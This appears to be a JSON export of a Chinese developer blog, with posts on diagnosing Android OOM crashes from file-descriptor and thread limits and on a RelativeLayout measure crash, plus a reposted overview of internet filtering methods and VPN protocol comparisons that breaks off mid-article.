摘要:本文发现了一类OOM（OutOfMemoryError），这类OOM的特点是崩溃时java堆内存和设备物理内存都充足，探索并解释了这类OOM抛出的原因。关键字: OutOfMemoryError ，OOM，pthread_create failed , Could not allocate JNI Env 引子对于每一个移动开发者，内存是都需要小心使用的资源，而线上出现的OOM（OutOfMemoryError）都会让开发者抓狂，因为我们通常仰仗的直观的堆栈信息对于定位这种问题通常帮助不大。 网上有很多资料教我们如何“紧衣缩食“的利用宝贵的堆内存（比如，使用小图片，bitmap复用等），可是: 线上的OOM真的全是由于堆内存紧张导致的吗？ 有没有App堆内存宽裕，设备物理内存也宽裕的情况下发生OOM的可能？ 内存充裕的时候出现OOM崩溃？看似不可思议，然而，最近笔者在调查一个问题的时候，通过自研的APM平台发现公司的一个产品的大部分OOM确实有这样的特征，即： OOM崩溃时，java堆内存远远低于Android虚拟机设定的上限，并且物理内存充足，SD卡空间充足 既然内存充足，这时候为什么会有OOM崩溃呢？ 问题描述在详细描述问题之前，先弄清楚一个问题：什么导致了OOM的产生？下面是几个关于Android官方声明内存限制阈值的API： 12345678ActivityManager.getMemoryClass()： 虚拟机java堆大小的上限，分配对象时突破这个大小就会OOMActivityManager.getLargeMemoryClass()：manifest中设置largeheap=true时虚拟机java堆的上限Runtime.getRuntime().maxMemory() ： 当前虚拟机实例的内存使用上限，为上述两者之一Runtime.getRuntime().totalMemory() ： 当前已经申请的内存，包括已经使用的和还没有使用的Runtime.getRuntime().freeMemory() ： 上一条中已经申请但是尚未使用的那部分。那么已经申请并且正在使用的部分used=totalMemory() - freeMemory()ActivityManager.MemoryInfo.totalMem: 设备总内存ActivityManager.MemoryInfo.availMem: 设备当前可用内存/proc/meminfo 记录设备的内存信息 图2-1 Android内存指标通常认为OOM发生是由于java堆内存不够用了，即 1Runtime.getRuntime().maxMemory()这个指标满足不了申请堆内存大小时 图2-2 Java堆OOM产生原因 这种OOM可以非常方便的验证（比如: 通过new byte[]的方式尝试申请超过阈值maxMemory()的堆内存），通常这种OOM的错误信息通常如下： 1java.lang.OutOfMemoryError: Failed to allocate a XXX byte allocation with XXX free bytes and XXXKB until OOM 图2-3 堆内存不够导致的OOM的错误信息 而前面已经提到了，本文中发现的OOM案例中堆内存充裕（Runtime.getRuntime().maxMemory()大小的堆内存还剩余很大一部分），设备当前内存也很充裕（ActivityManager.MemoryInfo.availMem还有很多）。这些OOM的错误信息大致有下面两种： 这种OOM在Android6.0，Android7.0上各个机型均有发生，文中简称为OOM一，错误信息如下： 1java.lang.OutOfMemoryError: Could not allocate JNI Env 图2-4 OOM一的错误信息 集中发生在Android7.0及以上的华为手机（EmotionUI_5.0及以上）的OOM，简称为OOM二，对应错误信息如下： 1java.lang.OutOfMemoryError: pthread_create (1040KB stack) failed: Out of memory 图2-5 OOM二的错误信息 问题分析及解决代码分析Android系统中，OutOfMemoryError这个错误是怎么被系统抛出的？下面基于Android6.0的代码进行简单分析： Android虚拟机最终抛出OutOfMemoryError的代码位于 /art/runtime/thread.cc 12void Thread::ThrowOutOfMemoryError(const char* msg)参数msg携带了OOM时的错误信息 图3-1 ART Runtime抛出的位置 搜索代码可以发现以下几个地方调用了上述方法抛出OutOfMemoryError错误 第一个地方是堆操作时123456系统源码文件： /art/runtime/gc/heap.cc函数： void Heap::ThrowOutOfMemoryError(Thread* self, size_t byte_count, AllocatorType allocator_type)抛出时的错误信息： oss &lt;&lt; \"Failed to allocate a \" &lt;&lt; byte_count &lt;&lt; \" byte allocation with \" &lt;&lt; total_bytes_free &lt;&lt; \" free bytes and \" &lt;&lt; PrettySize(GetFreeMemoryUntilOOME()) &lt;&lt; \" until OOM\"; 图3-2 Java堆OOM 这种抛出的其实就是堆内存不够用的时候，即前面提到的申请堆内存大小超过了Runtime.getRuntime().maxMemory() 第二个地方是创建线程时 12345678系统源码文件： /art/runtime/thread.cc函数： void Thread::CreateNativeThread(JNIEnv* env, jobject java_peer, size_t stack_size, bool is_daemon)抛出时的错误信息： \"Could not allocate JNI Env\" 或者 StringPrintf(\"pthread_create (%s stack) failed: %s\", PrettySize(stack_size).c_str(), strerror(pthread_create_result))); 图3-3 线程创建时OOM 对比错误信息，可以知道我们遇到的OOM崩溃就是这个时机，即创建线程的时候（Thread::CreateNativeThread）产生的。 还有其他的一些错误信息如”[XXXClassName] of length XXX would overflow“是系统限制String/Array的长度所致，不在本文讨论之列。 那么，我们关心的就是Thread::CreateNativeThread时抛出的OOM错误，创建线程为什么会导致OOM呢？ 推断既然抛出来OOM，一定是线程创建过程中触发了某些我们不知道的限制，既然不是Art虚拟机为我们设置的堆上限，那么可能是更底层的限制。 Android系统基于linux，所以linux的限制对于Android同样适用，这些限制有： /proc/pid/limits 描述着linux系统对对应进程的限制下面是一个样例： 1234567891011121314151617Limit Soft Limit Hard Limit Units Max cpu time unlimited unlimited seconds Max file size unlimited unlimited bytes Max data size unlimited unlimited bytes Max stack size 8388608 unlimited bytes Max core file size 0 unlimited bytes Max resident set unlimited unlimited bytes Max processes 13419 13419 processes Max open files 1024 4096 files Max locked memory 67108864 67108864 bytes Max address space unlimited unlimited bytes Max file locks unlimited unlimited locks Max pending signals 13419 13419 signals Max msgqueue size 819200 819200 bytes Max nice priority 40 40 Max realtime priority 0 0 Max realtime timeout unlimited unlimited us 图3-4 Linux进程限制示例 用排除法筛选上面样例中的limits: Max stack size，Max processes的限制是整个系统的，不是针对某个进程的，排除 Max locked memory ，排除，后面会分析，线程创建过程中分配线程私有stack使用的mmap调用没有设置MAP_LOCKED，所以这个限制与线程创建过程无关 Max pending signals，c层信号个数阈值，无关，排除 Max msgqueue size，Android IPC机制不支持消息队列，排除 剩下的limits项中，Max open files这一项限制最可疑 Max open files表示每个进程最大打开文件的数目，进程每打开一个文件就会产生一个文件描述符fd（记录在/proc/pid/fd下面），这个限制表明fd的数目不能超过Max open files规定的数目。 后面分析线程创建过程中会发现过程中涉有及到文件描述符。 /proc/sys/kernel中描述的限制这些限制中与线程相关的是/proc/sys/kernel/threads-max，规定了每个进程创建线程数目的上限，所以线程创建导致OOM的原因也有可能与这个限制相关。Ps：其实这里的说法并不完全正确，根据博主自己测试以及查询相关资料后得知，该文件规定的应该是整个系统总的线程数目限制Pss：目前并没有找到相关的方法查询到明确的线程限制，我们只能通过 ulimit -a 指令查看一些别的限制条件，通过测试得知，部分华为手机单进程限制线程数为500左右 验证下面对上述的推断进行验证，分两步：本地验证和线上验收。 本地验证：在本地验证推断，试图复现与图[2-4]OOM一与图[2-5]OOM二所示错误消息一致的OOM 线上验收：下发插件，验收线上用户OOM时确实是由于上面的推断的原因导致的。 本地验证实验一： 触发大量网络连接（每个连接处于独立的线程中）并保持，每打开一个socket都会增加一个fd（/proc/pid/fd下多一项） 注：不只有这一种增加fd数的方式，也可以用其他方法，比如打开文件，创建handlerthread等等 实验预期：当进程fd数（可以通过 ls /proc/pid/fd | wc -l 获得）突破 /proc/pid/limits中规定的Max open files时，产生OOM 实验结果：当fd数目到达 /proc/pid/limits中规定的Max open files时，继续开线程确实会导致OOM的产生。错误信息及堆栈如下： 1234567E/art: ashmem_create_region failed for 'indirect ref table': Too many open filesE/AndroidRuntime: FATAL EXCEPTION: main Process: com.netease.demo.oom, PID: 2435 java.lang.OutOfMemoryError: Could not allocate JNI Env at java.lang.Thread.nativeCreate(Native Method) at java.lang.Thread.start(Thread.java:730) ...... 图3-5 FD数超限导致OOM的详细信息 可以看出，此OOM发生时的错误信息确与线上发现的OOM一的“Could not allocate JNI Env”吻合，因此线上上报的OOM一可能就是由FD数超限导致的，不过最终确定需要到线上进行验证(下一小节). 此外从ART虚拟机的Log中看出，还有一个关键的信息“ art: ashmem_create_region failed for ‘indirect ref table’: Too many open files”，后面会用于问题定位及解释。实验二： 创建大量的空线程（不做任何事情，直接sleep） 实验预期：当线程数（可以在/proc/pid/status中的threads项实时查看）超过/proc/sys/kernel/threads-max中规定的上限时产生OOM崩溃 实验结果： 在Android7.0及以上的华为手机（EmotionUI_5.0及以上）的手机产生OOM，这些手机的线程数限制都很小(应该是华为rom特意修改的limits)，每个进程只允许最大同时开500个线程，因此很容易复现了。OOM时错误信息如下： 12345678W libc : pthread_create failed: clone failed: Out of memoryW art : Throwing OutOfMemoryError \"pthread_create (1040KB stack) failed: Out of memory\"E AndroidRuntime: FATAL EXCEPTION: main Process: com.netease.demo.oom, PID: 4973 java.lang.OutOfMemoryError: pthread_create (1040KB stack) failed: Out of memory at java.lang.Thread.nativeCreate(Native Method) at java.lang.Thread.start(Thread.java:745) ...... 图3-6 线程数超限导致的OOM详细信息 可以看出错误信息与我们线上遇到的OOM二吻合：”pthread_create (1040KB stack) failed: Out of memory” 另外ART虚拟机还有一个关键Log：“pthread_create failed: clone failed: Out of memory”，后面会用于问题定位及解释。 其他Rom的手机线程数的上限都比较大，不容易复现上述问题。但是，对于32位的系统，当进程的逻辑地址空间不够的时候也会产生OOM,每个线程通常需要mapp 1MB左右的stack空间（stack大小可以自行设置），32为系统进程逻辑地址4GB，用户空间少于3GB。逻辑地址空间不够（已用逻辑空间地址可以查看/proc/pid/status中的VmPeak/VmSize记录），此时创建线程产生的OOM具有如下信息： 12345678W/libc: pthread_create failed: couldn't allocate 1069056-bytes mapped space: Out of memoryW/art: Throwing OutOfMemoryError \"pthread_create (1040KB stack) failed: Try again\"E/AndroidRuntime: FATAL EXCEPTION: main Process: com.netease.demo.oom, PID: 8638 java.lang.OutOfMemoryError: pthread_create (1040KB stack) failed: Try again at java.lang.Thread.nativeCreate(Native Method) at java.lang.Thread.start(Thread.java:1063) ...... 图3-7 逻辑地址空间占满导致的OOM 线上验收及问题解决本地尝试复现的OOM错误信息中图[3-5]与线上OOM一情况比较吻合，图[3-6]与线上OOM二的情况比较吻合，但线上的OOM一真的时FD数目超限，OOM二真的是由于华为手机线程数超限的原因导致的吗？最终确定还需要取线上设备的数据进行验证．验证方法： 下发插件到线上用户，当Thread.UncaughtExceptionHandler捕获到OutOfMemoryError时记录/proc/pid目录下的如下信息： /proc/pid/fd目录下文件数(fd数) /proc/pid/status中threads项（当前线程数目） OOM的日志信息（出了堆栈信息还包含其他的一些warning信息 线上OOM一验证 发生OOM一的线上设备中采集到的信息： /proc/pid/fd目录下文件数与/proc/pid/limits中的Max open files 数目持平，证明FD数目已经满了 崩溃时日志信息与图[3-5]基本一致 由此，证明线上的OOM一确实是由于FD数目过多导致的OOM，推断验证成功．OOM一的定位与解决： 最终原因是App中使用的长连接库再某些时候会有瞬时发出大量http请求的bug(导致FD数激增)，已修复线上OOM二验证 集中在华为系统的OOM二崩溃时收集到的信息样例如下，（收集的样例中包含的devicemodel有VKY-AL00，TRT-AL00A，BLN-AL20，BLN-AL10，DLI-AL10，TRT-TL10，WAS-AL00等）： /proc/pid/status中threads记录全部到达上限：Threads: 500 崩溃时日志信息与图[3-6]基本一致 推断验证成功，即线程数受限导致创建线程时clone failed导致了线上的OOM二。OOM二的定位与解决： 关于App业务代码中的问题还在定位修复中 解释下面从代码分析本文描述的OOM是怎么发生的，首先线程创建的简易版流程图如下所示： 图3-8 线程创建流程 上图中，线程创建大概有两个关键的步骤： 第一列中的创建线程私有的结构体JNIENV(JNI执行环境，用于C层调用Java层代码) 第二列中的调用posix C库的函数pthread_create进行线程创建工作 下面对流程图中关键节点（图中有标号的）进行说明： 图中节点①， /art/runtime/thread.cc中的函数Thread:CreateNativeThread部分节选代码如下： 12345std::string msg(child_jni_env_ext.get() == nullptr ? \"Could not allocate JNI Env\" : StringPrintf(\"pthread_create (%s stack) failed: %s\", PrettySize(stack_size).c_str(), strerror(pthread_create_result)));ScopedObjectAccess soa(env);soa.Self()-&gt;ThrowOutOfMemoryError(msg.c_str()); 图3-9 Thread:CreateNativeThread节选 可知： JNIENV创建不成功时产生OOM的错误信息为“Could not allocate JNI Env”，与文中OOM一一致 pthread_create失败时抛出OOM的错误信息为”pthread_create (%s stack) failed: %s”．其中详细的错误信息由pthread_create的返回值（错误码）给出．错误码与错误描述的对应关系可以参见bionic/libc/include/sys/_errdefs.h中的定义．文中OOM二的具体错误信息为”Out of memory”，就说明pthread_create的返回值为12. 123456...__BIONIC_ERRDEF( EAGAIN , 11, \"Try again\" )__BIONIC_ERRDEF( ENOMEM , 12, \"Out of memory\" )...__BIONIC_ERRDEF( EMFILE , 24, \"Too many open files\" )... 图3-10 系统错误定义_errdefs.h 图中节点②和③是创建JNIENV过程的关键节点，节点②/art/runtime/mem_map.cc中函数MemMap:MapAnonymous的作用是为JNIENV结构体中Indirect_Reference_table（C层用于存储JNI局部/全局变量）申请内存，申请内存的方法是节点③所示的函数ashmem_create_region（创建一块ashmen匿名共享内存,并返回一个文件描述符）．节点②代码节选如下： 1234if (fd.get() == -1) &#123; *error_msg = StringPrintf(\"ashmem_create_region failed for '%s': %s\", name, strerror(errno)); return nullptr;&#125; 图3-11 MemMap:MapAnonymous节选 我们线上的OOM一的错误信息＂ashmem_create_region failed for ‘indirect ref table’: Too many open files＂，与此处打印的信息吻合．＂Too many open files＂的错误描述说明此处的errno（系统全局错误标识）为24(见图[3-10]系统错误定义_errdefs.h)． 由此看出我们线上的OOM一是由于文件描述符数目已满，ashmem_create_region无法返回新的FD而导致的． 图中节点④和⑤是调用C库创建线程时的环节，创建线程首先调用__allocate_thread函数申请线程私有的栈内存(stack)等，然后调用clone方法进行线程创建．申请stack采用的时mmap的方式，节点⑤代码节选如下： 1234567if (space == MAP_FAILED) &#123; __libc_format_log(ANDROID_LOG_WARN, \"libc\", \"pthread_create failed: couldn't allocate %zu-bytes mapped space: %s\", mmap_size, strerror(errno)); return NULL;&#125; 图3-12 __create_thread_mapped_space节选 打印的错误信息与图[3-7]中进程逻辑地址占满导致的OOM错误信息吻合，图[3-7]中错误信息＂ Try again＂说明系统全局错误标识errno为11(见图[3-10]系统错误定义_errdefs.h). pthread_create过程中，节点４相关代码如下： 12345678910111213int rc = clone(__pthread_start, child_stack, flags, thread, &amp;(thread-&gt;tid), tls, &amp;(thread-&gt;tid)); if (rc == -1) &#123; int clone_errno = errno; // We don't have to unlock the mutex at all because clone(2) failed so there's no child waiting to // be unblocked, but we're about to unmap the memory the mutex is stored in, so this serves as a // reminder that you can't rewrite this function to use a ScopedPthreadMutexLocker. pthread_mutex_unlock(&amp;thread-&gt;startup_handshake_mutex); if (thread-&gt;mmap_size != 0) &#123; munmap(thread-&gt;attr.stack_base, thread-&gt;mmap_size); &#125; __libc_format_log(ANDROID_LOG_WARN, \"libc\", \"pthread_create failed: clone failed: %s\", strerror(errno)); return clone_errno; &#125; 图3-13 pthread_create节选 此处输出的错误日志”pthread_create failed: clone failed: %s”与我们线上发现的OOM二吻合，图[3-6]中的错误描述＂ Out of memory＂说明系统全局错误标识errno为12(见图[3-10]系统错误定义_errdefs.h). 由此线上的OOM二就是由于线程数的限制而在节点5 clone失败导致OOM. 结论及监控导致OOM发生的原因综上，可以导致OOM的原因有以下几种： 文件描述符(fd)数目超限，即proc/pid/fd下文件数目突破/proc/pid/limits中的限制。可能的发生场景有：短时间内大量请求导致socket的fd数激增，大量（重复）打开文件等 线程数超限，即proc/pid/status中记录的线程数（threads项）突破/proc/sys/kernel/threads-max中规定的最大线程数。可能的发生场景有：app内多线程使用不合理，如多个不共享线程池的OKhttpclient等等 传统的java堆内存超限，即申请堆内存大小超过了 Runtime.getRuntime().maxMemory() （低概率）32为系统进程逻辑空间被占满导致OOM. 其他 监控措施可以利用linux的inotify机制进行监控: watch /proc/pid/fd来监控app打开文件的情况, watch /proc/pid/task来监控线程使用情况． DemoPOC(Proof of concept) 代码参见：https://github.com/piece-the-world/OOMDemo","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"Android RelativeLayout measure方法 crush问题","slug":"Android-RelativeLayout-measure-crush问题","date":"2018-07-22T07:51:12.000Z","updated":"2020-05-11T07:23:44.517Z","comments":true,"path":"2018/07/22/Android-RelativeLayout-measure-crush问题/","link":"","permalink":"https://superxlcr.github.io/2018/07/22/Android-RelativeLayout-measure-crush问题/","excerpt":"","text":"最近在某些版本较低的手机上，遇到了RelativeLayout在执行measure方法时crush，在此写下博客记录一下 情景再现在做需求的时候，本人inflate了一个RelativeLayout，并手动调用了其measure，打算测量其所需要的高宽，代码如下：布局文件： 1234567&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;RelativeLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\"&gt; &lt;!--其他布局....--&gt;&lt;/RelativeLayout&gt; java代码： 12345View layout = LayoutInflater.from(this).inflate(R.layout.relative_layout, null);layout.measure(View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED), View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED));layout.getMeasuredWidth();layout.getMeasuredHeight(); 在大多数设备上，这段代码运行没有任何问题然而，在api 19以下的手机运行，应用crush了，报错的堆栈信息如下： 从堆栈信息我们可以推断出，这是一个RelativeLayout源码中onMeasure方法的空指针问题 源码分析根据堆栈信息的指示，我们找到了api 19 以及 api 18 的RelativeLayout源码，并把他们的onMeasure方法进行比对： 左边为api 18 的代码，右边为api 19 的代码从比较关键的对比截图看出，代码中主要的区别是为LayoutParams增加了判空处理，因此我们可以大胆猜测，空指针是由于我们inflate出来的RelativeLayout没有设置LayoutParams导致的api 19 以上的代码也有LayoutParams为空的问题，只不过这边添加了判空处理 这时我们需要看回LayoutInflater的源码我们调用inflate方法时，传入的root为null，其最终调用的源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public View inflate(XmlPullParser parser, @Nullable ViewGroup root, boolean attachToRoot) &#123; synchronized (mConstructorArgs) &#123; ... if (TAG_MERGE.equals(name)) &#123; if (root == null || !attachToRoot) &#123; throw new InflateException(\"&lt;merge /&gt; can be used only with a valid \" + \"ViewGroup root and attachToRoot=true\"); &#125; rInflate(parser, root, inflaterContext, attrs, false); &#125; else &#123; // Temp is the root view that was found in the xml final View temp = createViewFromTag(root, name, inflaterContext, attrs); ViewGroup.LayoutParams params = null; if (root != null) &#123; if (DEBUG) &#123; System.out.println(\"Creating params from root: \" + root); &#125; // Create layout params that match root, if supplied params = root.generateLayoutParams(attrs); if (!attachToRoot) &#123; // Set the layout params for temp if we are not // attaching. (If we are, we use addView, below) temp.setLayoutParams(params); &#125; &#125; if (DEBUG) &#123; System.out.println(\"-----&gt; start inflating children\"); &#125; // Inflate all children under temp against its context. rInflateChildren(parser, temp, attrs, true); if (DEBUG) &#123; System.out.println(\"-----&gt; done inflating children\"); &#125; // We are supposed to attach all the views we found (int temp) // to root. Do that now. if (root != null &amp;&amp; attachToRoot) &#123; root.addView(temp, params); &#125; // Decide whether to return the root that was passed in or the // top view found in xml. if (root == null || !attachToRoot) &#123; result = temp; &#125; &#125; ... &#125;&#125; 由于我们根布局的tag不为merge，因此代码会走入12行的else语句执行在第14行，通过反射实例化了我们顶层的ViewGroup布局temp在第18行，在传入的root参数不为null的情况下，会为我们的temp生成相应的LayoutParams如果传入的attach参数为false，则在28行为temp设置LayoutParams，否则在第46行addView的时候设置 解决方案在根据源码发现问题后，我们只需修改代码，在inflate的时候传入相应的root参数即可 Ps：其实在传入root参数为null的情况下，一般IDE都会有相应的警告提醒的，看来以后还是要多注意这种warning信息才行","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"上网限制和翻墙基本原理","slug":"上网限制和翻墙基本原理","date":"2018-07-01T02:35:54.000Z","updated":"2020-05-11T07:23:44.789Z","comments":true,"path":"2018/07/01/上网限制和翻墙基本原理/","link":"","permalink":"https://superxlcr.github.io/2018/07/01/上网限制和翻墙基本原理/","excerpt":"","text":"本文转载自：http://blog.021xt.cc/archives/85 目前在国内基本访问不了google站点和android的站点，下载个gradle都要等很久。所以如果不翻墙很多工作都没办法正常做。所以在学习翻墙的同时也顺便了解了下目前限制网络访问的一些基本知识。 网络限制和监控应该说大家都有体会。比如很多公司都会限制一些网站的访问，比如网盘、视屏网站。有时也会对你访问的内容进行监控。还有一些公共WIFI，可能限制你只能访问80端口。在比如在国内无法访问google，facebook，android等网站。要想绕过这些限制，必须先知道他们是如何限制的。 本文主要是从技术角度来了解的网络限制方式和应对方式。并不做任何翻墙方式的推荐和指导。对于网络的知识，还是停留在上过网络课 的水平，文章内容也都是自己了解后总结的。可能会有错误和遗漏。会定期更新。 DNS污染和劫持以下解释来之百度百科：某些网络运营商为了某些目的，对DNS进行了某些操作，导致使用ISP的正常上网设置无法通过域名取得正确的IP地址。某些国家或地区出于某些目的为了防止某网站被访问，而且其又掌握部分国际DNS根目录服务器或镜像，也会利用此方法进行屏蔽。 目前我们访问网站主要都是通过域名进行访问，而真正访问这个网站前需要通过DNS服务器把域名解析为IP地址。而普通的DNS服务使用UDP协议，没有任何的认证机制。DNS劫持是指返回给你一个伪造页面的IP地址，DNS污染是返回给你一个不存在的页面的IP地址。 比如你使用电信、联通、移动的宽带，默认你是不需要设置任何DNS服务器的。这些DNS服务器由他们提供。一旦检测到你访问的网页是不允许的访问的，就会返回一个不存在的网页。而很多运营商也会使用DNS劫持来投放一些广告。 解决办法： 使用OpenDNS（208.67.222.222）或GoogleDNS（8.8.8.8）（现在不太好用，被封锁，速度慢） 使用一些第三方的DNS服务器 自己用VPS搭建DNS服务器 修改机器host文件，直接IP访问 封锁IP通过上面一些方式，可以绕过DNS污染，通过IP地址访问无法访问的网页。但是目前针对IP进行大范围的封锁。虽然google这种大公司有很多镜像IP地址，但是目前基本全部被封锁掉，有漏网的可能也坚持不了多久。而且很多小公司的服务是部署在一些第三方的主机上，所以封锁IP有时会误伤，封锁一个IP导致主机上本来可以使用的页面也无法访问了。 不过目前不可能把所有国外的IP全部封锁掉，所以我们采用机会从国内连接到国外的VPS，进行翻墙。 解决办法： 使用VPS搭建代理 使用IPV6 （IPV6地址巨大，采用封地址不现实，但是目前国内只有部分高校部署了IPV6） 封锁HTTP代理对于没有办法搭建VPS的人来说，最好的办法就是使用HTTP代理。客户端不在直接请求目标服务器，而是请求代理服务器，代理服务器在去请求目标服务器。然后返回结果。关于HTTP代理可以参考 1《HTTP权威指南》第六章：代理 对于HTTP代理来说，封锁起来非常简单。因为HTTP协议是明文，Request Message中就带有要请求的URL或IP地址，这样很容易就被检测到。对于HTTPS来说，虽然通信是进行加密了，但是在建连之前会给代理服务器发送CONNECT方法，这里也会带上要访问的远端服务器地址。如果代理服务器在国外，在出去前就会被检测到。 如果代理服务器在国内，呵呵，你也出不去啊。 对于HTTP代理，因为是明文，所以很容易被服务器了解你的一些数据。所以不要随便使用第三方的HTTP代理访问HTTP网站，而HTTPS虽然不知道你的数据，但是可以知道你去了那里。 解决办法： 使用VPS搭建VPN 使用第三方VPN 封锁VPN虚拟专用网（英语：Virtual Private Network，简称VPN），是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。虚拟私人网络的讯息透过公用的网络架构（例如：互联网）来传送内联网的网络讯息。它利用已加密的通道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果。 正常网络通信时，所有网络请求都是通过我们的物理网卡直接发送出去。而VPN是客户端使用相应的VPN协议先与VPN服务器进行通信，成功连接后就在操作系统内建立一个虚拟网卡，一般来说默认PC上所有网络通信都从这虚拟网卡上进出，经过VPN服务器中转之后再到达目的地。 通常VPN协议都会对数据流进行强加密处理，从而使得第三方无法知道数据内容，这样就实现了翻墙。翻墙时VPN服务器知道你干的所有事情（HTTP，对于HTTPS，它知道你去了哪）。 VPN有多种协议：OPENVPN、PPTP、L2TP/IPSec、SSLVPN、IKEv2 VPN，Cisco VPN等。其中的PPTP和L2TP是明文传输协议。只负责传输，不负责加密。分别利用了MPPE和IPSec进行加密。 背景 PPTP 是一个基于 PPP 的很基本的协议。PPTP 是微软 Windows 平台第一个支持的 VPN 协议。PPTP 标准并没有实际描述加密和授权特性，并且依赖于 PPP 协议的隧道来实现安全功能。 L2TP 是一个在 IETF RFC 3193 中被正式标准化的高级协议。推荐在需要安全加密的地方用来替代 PPTP。 OpenVPN 是一个高级的开源 VPN 解决方案，由 “OpenVPN technologies” 支持，并且已经成为开源网络领域里的事实标准。OpenVPN 使用成熟的 SSL/TLS 加密协议。 数据加密 PPP 负载是使用微软点对点协议（Microsoft’s Point-to-Point Encryption protocol，MPPE）加密。MPPE 实现了 RSA RC4 加密算法，并使用最长 128 位密钥。 L2TP 负载使用标准的 IPSec 协议加密。在 RFC 4835 中指定了使用 3DES 或 AES 加密算法作为保密方式。 OpenVPN 使用 OpenSSL 库来提供加密。OpenSSL 支持好几种不同的加密算法，如：3DES，AES，RC5 等。 安装/配置 Windows 所有版本和大多数其他操作系统包括移动平台都内建了对 PPTP 的支持。PPTP 只需要一个用户名和密码，以及一个服务器地址，所以安装和配置相当简单。 从 2000/XP 起的所有 Windows 平台和 Mac OS X 10.3+ 都内建了 L2TP/IPSec 的支持。大多数现代的移动平台比如 iPhone 和 Android 也有内建的客户端。 OpenVPN 不包含在任何操作系统中，需要安装客户端软件，但安装也是相当简单，基本上 5 分钟可以完成。 速度 由于使用 128 位密钥，加密开销相比 OpenVPN 使用 256位密钥要小，所以速度感觉稍快一点，但这个差异微不足道。 L2TP/IPSec 将数据封装两次，所以相比其他竞争者效率稍低，速度也慢一些。 当使用默认的 UDP 模式，OpenVPN 的表现是最佳的。 端口 PPTP 使用 TCP 1723 端口和 GRE（协议 47）。通过限制 GRE 协议，PPTP 可以轻易地被封锁。 L2TP/IPSec 使用 UDP 500 端口用来初始化密钥交换，使用协议 50 用来传输 IPSec 加密的数据（ ESP ），使用 UDP 1701 端口用来初始化 L2TP 的配置，还使用 UDP 4500 端口来穿过 NAT。L2TP/IPSec 相比 OpenVPN 容易封锁，因为它依赖于固定的协议和端口。 OpenVPN 可以很容易的配置为使用任何端口运行，也可以使用 UDP 或 TCP 协议。为了顺利穿越限制性的防火墙，可以将 OpenVPN 配置成使用 TCP 443 端口，因为这样就无法和标准的 HTTPS 无法区分，从而极难被封锁。 稳定性/兼容性 PPTP 不如 OpenVPN 可靠，也不能像 OpenVPN 那样在不稳定网络中快速恢复。另外还有部分同 GRE 协议和一些路由器的兼容性问题。 L2TP/IPSec 比 OpenVPN 更复杂，为了使在 NAT 路由器下的设备可靠地使用，配置可以会更加困难。但是，只要服务器和客户端都支持 NAT 穿越，那么就没什么问题了。 无论是无线网络、蜂窝网络，还是丢包和拥塞经常发生的不可靠网络，OpenVPN 都非常稳定、快速。对于那些相当不可以的连接，OpenVPN 有一个 TCP 模式可以使用，但是要牺牲一点速度，因为将 TCP 封装在 TCP 时效率不高。 安全弱点 微软实现的 PPTP 有一个严重的安全问题（serious security vulnerabilities）。对于词典攻击来说 MSCHAP-v2 是很脆弱的，并且 RC4 算法也会遭到“位翻转攻击（ bit-flipping attack ）”。如果保密是重要的，微软也强烈建议升级到 IPSec。 IPSec 没有明显的漏洞，当和安全加密算法如 AES 一起使用时，被认为是很安全的。 OpenVPN 也没有明显漏洞，当和安全加密算法如 AES 一起使用时，也被认为是相当安全的。 客户端的兼容性 Windows、Mac OS X、Linux、Apple iOS、Android、DD-WRT Windows、Mac OS X、Linux、Apple iOS、Android Windows、Mac OS X、Linux 结论 由于主要的安全漏洞，除了兼容性以外没有好的理由选择使用 PPTP。如果你的设备既不支持 L2TP/IPSec 又不支持 OpenVPN，那么 PPTP 是一个合理的选择。如果关心快速安装和简易配置，那么 L2TP/IPSec 值得考虑。 L2TP/IPSec 是优秀的，但相比 OpenVPN 的高效和杰出的稳定性要落后一点。如果你使用运行 iOS 或 Android 的移动设备，那么这就是最佳的选择，因为 OpenVPN 目前还不支持这些平台。另外，如果需要快速安装，L2TP/IPSec 也是一个较佳的选择。 对于所有的 Windows, Mac OS X 以及 Linux 桌面用户来说，OpenVPN 是最好的选择。OpenVPN 速度快，并且安全可信。但劣势是缺乏对移动设备的支持，另外还需要安装第三方客户端。 等级 对于VPN和其他一些加密的传输的协议来说，没有办法直接获取明文的请求信息，所以没有办法直接封锁，而是使用了监控的方式： 暴力破解对于一些使用弱加密方式的协议来说，直接使用暴力破解检查传输内容。比如PPTP使用MPPE加密，但是MPPE是基于RC4，对于强大的防火墙背后的超级计算机集群，破解就是几秒钟的事情。 破解后明文中一旦包含了违禁内容，请求就会被封。而对应的IP可能会进入重点关怀列表。 特征检测要想成功翻墙都必须与对应的远程服务器建立连接，然后再用对应的协议进行数据处理并传输。而问题就出在这里：翻墙工具和远程服务器建立连接时，如果表现的很独特，在一大堆流量里很显眼，就会轻易被GFW识别出从而直接阻断连接，而VPN（尤其是OPENVPN）和SSH这方面的问题尤其严重。 流量监控当一个VPN地址被大量人请求，并保持长时间连接时，就很容易引起关注。SSH接口有大量数据请求。一般会结合其他特征。 深度包检测深度数据包检测（英语：Deep packet inspection，缩写为 DPI），又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种电脑网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵，或以预定之准则来决定数据包是否可通过或需被路由至其他不同目的地，亦或是为了收集统计数据之目的。 